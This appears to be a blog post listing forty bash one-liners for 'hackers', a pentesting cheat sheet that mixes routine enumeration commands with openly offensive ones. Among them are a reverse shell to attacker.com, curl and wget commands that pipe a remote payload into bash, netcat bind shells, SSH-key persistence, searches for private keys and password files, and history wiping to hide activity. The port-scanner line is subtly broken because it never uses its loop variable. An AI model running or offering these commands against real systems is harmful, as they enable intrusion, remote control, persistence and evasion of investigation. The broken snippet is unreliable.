*From:* `https://medium.com/@verylazytech/40-bash-one-liners-every-hacker-should-know-master-essential-command-line-skills-for-pentesting-01c32fb29eea`

# 40 Bash One-Liners Every Hacker Should Know

## 1. Find All SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

## 2. Search for World-Writable Files
```bash
find / -type f -perm -2 -ls 2>/dev/null
```

## 3. List All Open Network Ports
```bash
netstat -tulnp 2>/dev/null
```
```bash
ss -tulnp
```

## 4. Scan for Alive Hosts in a Subnet
```bash
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "64 bytes" & done
```

## 5. Download a File Without wget or curl
```bash
echo "GET /evil.sh HTTP/1.0\r\n" | nc yourhost.com 80 > evil.sh
```

## 6. Simple HTTP Server
```bash
python3 -m http.server 8000
```
```bash
python -m SimpleHTTPServer 8000
```

## 7. Bash Reverse Shell
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

## 8. Grab Crontabs for All Users
```bash
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done
```

## 9. Find Files Containing a Keyword
```bash
grep -Ri 'password' /etc 2>/dev/null
```

## 10. Enumerate Running Processes
```bash
ps auxww
```

## 11. Extract IP Addresses from a File
```bash
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' filename.txt | sort -u
```

## 12. List Listening Services
```bash
lsof -i -P -n | grep LISTEN
```

## 13. Base64 Encode / Decode
```bash
echo 'yourstring' | base64
```
```bash
echo 'b3BlbnNlc2FtZQ==' | base64 -d
```

## 14. Files Modified in Last X Minutes
```bash
find /tmp -type f -mmin -10 2>/dev/null
```

## 15. Replace Strings in All Files
```bash
find . -type f -exec sed -i 's/oldstring/newstring/g' {} +
```

## 16. Download and Execute in Memory
```bash
curl http://attacker.com/payload.sh | bash
```
```bash
wget -qO- http://attacker.com/payload.sh | bash
```

## 17. Find Hidden Files
```bash
find / -name ".*" 2>/dev/null
```

## 18. Check Recent Logins
```bash
last -a | head -10
```

## 19. Dump Environment Variables
```bash
env
```
```bash
env > /tmp/envdump.txt
```

## 20. Netcat Bind Shell
```bash
nc -lvnp 4444 -e /bin/bash
```
```bash
nc -l -p 4444 -e /bin/sh
```

## 21. Get Internal IP Address
```bash
hostname -I
```
```bash
ip addr show | grep 'inet ' | awk '{print $2}'
```

## 22. Enumerate sudo Privileges
```bash
sudo -l
```

## 23. Search for SSH Keys
```bash
find /home -name "id_rsa*" 2>/dev/null
```

## 24. Find World-Readable Password Files
```bash
find / -type f -name "*pass*" -perm -o=r 2>/dev/null
```

## 25. Find Users with UID 0
```bash
awk -F: '($3 == "0") {print $1}' /etc/passwd
```

## 26. Download and Unzip in One Line
```bash
curl -sL http://attacker.com/payload.zip | funzip > payload.sh
```

## 27. List Largest Files
```bash
find / -type f -exec du -h {} + | sort -rh | head -20
```

## 28. Directory Bruteforce
```bash
for word in $(cat wordlist.txt); do curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" http://target/$word; done
```

## 29. List USB Devices
```bash
lsusb
```
```bash
dmesg | grep -i usb
```

## 30. Quick System Info
```bash
uname -a; uptime; cat /etc/os-release
```

## 31. Logged-In Users
```bash
who
```
```bash
w
```

## 32. Find Writable Directories
```bash
find / -type d -perm -2 -ls 2>/dev/null
```

## 33. List systemd Services
```bash
systemctl list-units --type=service
```

## 34. In-Place Text Substitution
```bash
sed -i 's/old/new/g' file.txt
```

## 35. Recently Installed Packages
```bash
grep "install " /var/log/dpkg.log
```
```bash
grep "Installed:" /var/log/yum.log
```

## 36. Files Owned by a User
```bash
find / -user root 2>/dev/null
```

## 37. List Services (init.d)
```bash
service --status-all 2>&1 | grep '+'
```
```bash
/etc/init.d/* status
```

## 38. Add SSH Key for Persistence
```bash
echo "ssh-rsa AAAAB3... attacker@host" >> ~/.ssh/authorized_keys
```

## 39. Bash Port Scanner
```bash
for port in {1..1024}; do (echo > /dev/tcp/target/port) >/dev/null 2>&1 && echo "Port $port open"; done
```

## 40. Wipe Bash History
```bash
history -c && history -w && unset HISTFILE
```
